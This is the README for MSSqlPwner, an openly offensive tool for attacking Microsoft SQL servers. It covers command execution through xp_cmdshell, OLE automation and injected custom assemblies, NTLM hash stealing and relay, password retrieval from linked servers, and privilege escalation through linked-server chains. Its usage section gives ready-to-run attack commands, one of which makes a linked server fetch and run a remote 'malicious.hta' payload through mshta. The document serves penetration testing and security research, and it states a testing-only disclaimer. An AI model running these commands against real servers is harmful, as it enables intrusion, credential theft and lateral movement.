# MSSqlPwner
<p align="center">
 <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/logo.PNG?raw=true">
</p>
MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact with MSSQL servers and based on Impacket.
The MSSqlPwner tool empowers ethical hackers and security professionals to conduct comprehensive security assessments on MSSQL environments.

With MSSqlPwner, users can execute custom commands through various methods, including custom assembly, `xp_cmdshell`, and `sp_oacreate(Ole Automation Procedures)` and much more. 

The tool starts with recursive enumeration on linked servers and gather all the possible chains.

Also, the MSSqlPwner tool can be used for NTLM relay capabilities, utilizing functions such as `xp_dirtree`, `xp_subdirs`, `xp_fileexist`, and command execution.

This tool provide opportunities for lateral movement assessments and exploration of linked servers.

If the authenticated MSSQL user does not have permission to execute certain operations, the tool can find a chain that might allow the execution. 
For example, it can send a query to a linked server that returns back with a link to the authenticated MSSQL service with higher permissions.
The tool also supports recursive querying via links to execute queries and commands on otherwise inaccessible linked servers directed from the compromised MSSQL service.

## Example
<p align="center">
 <img src="https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/poc.png?raw=true">
</p>

This tool is supported by multiple authentication methods and described below.

## Disclaimer
This tool is designed for security professionals and researchers for testing purposes only and should not be used for illegal purposes.

## Functionalities:
1. Utilities:
- `interactive`: allow to use the tool interactively with live execution.
- `enumerate`: enumerate the linked servers and the chains.
- `get-chain-list` get the list of the chains (You can filter by hostname using the flag `-filter-hostname HOSTNAME`).
- `get-link-server-list` get the list of the linked servers.
- `set-chain` Set chain ID (For interactive-mode only!)
- `set-link-server` Set link server (For interactive-mode only!)
- `get-rev2self-queries` retrieve queries to revert to SELF (For interactive-mode only!).
- `get-adsi-provider-list` retrieve ADSI provider list.
- `rev2self` revert to SELF (For interactive-mode only!).

2. Command Execution: Execute commands using the following functions:
- `xp_cmdshell` Execute commands using `xp_cmdshell` on local server or on linked servers
- `sp_oacreate` Execute commands using Ole Automation Procedure technique on local server or on linked servers

3. Password Retrieval:
- `retrive-password` Password retrieval from the linked server.

4. NTLM Hash Stealing and Relay: Issue NTLM relay or steal NTLM hashes using the following functions:
- `xp_dirtree` NTLM stealing using directory listing on local server or on linked servers
- `xp_subdirs` NTLM stealing using subdirectory listing on local server or on linked servers
- `xp_fileexist` NTLM Stealing using file existence check on local server or on linked servers

5. Procedure execution using custom assembly and stored procedures:
- `execute_command` procedure executing commands using custom assembly on local server or on linked servers
- `run_query` procedure executing queries using custom assembly on local server or on linked servers
- `run_query_system_service` procedure executing queries using custom assembly on local server or on linked servers as system user
- `inject-custom-asm` Inject code using custom assembly on local server or on linked servers (You can use modify the following [DLL Example](https://github.com/ScorpionesLabs/MSSqlPwner/blob/main/playbooks/custom-asm/Inject.cs).
6. Direct Queries 
- `direct_query` Execute direct queries on local server or on linked servers


## Lateral Movement and Chain Exploration:
MSSqlPwner provides opportunities for lateral movement assessments and exploration of linked servers. 
In scenarios where the current session lacks administrative privileges, the tool attempts to find a chain that escalates its own privileges via linked servers. 
If a session on a linked server has higher privileges, the tool can interact with the linked server and perform a linked query back to the host with elevated privileges, enabling lateral movement with the target server.

## Authentication Methods:
Supported by multiple authentication methods, including:
- Windows credentials
- MSSQL credentials
- Kerberos authentication
- Kerberos tickets
- NTLM Hashes

The tool adapts to various scenarios and environments, verifying the effectiveness of authentication mechanisms.

Take your MSSQL environment assessments to the next level with the power and versatility of MSSqlPwner. 
Discover new possibilities for lateral movement, stealthy querying, and precise security evaluations with this the MSSqlPwner tool.

## Installation
```
git clone https://github.com/ScorpionesLabs/MSSqlPwner
cd MSSqlPwner
pip3 install -r requirements.txt
python3 MSSqlPwner.py
```


## Usage
```
# Interactive mode
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive


# Executing custom assembly on the current server with windows authentication and executing hostname command 
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth direct_query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01
python3 MSSqlPwner.py corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
```


## Thanks
- [Kim Dvash](https://www.linkedin.com/in/kim-d-5b3114111) for designing this incredible logo.
- [Pablo Martínez](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/) for the inspiration and the idea of the retrieving password technique.
- [Omri Baso](https://www.linkedin.com/in/omri-baso-875aaa191/) for helping with inspiration and ideas.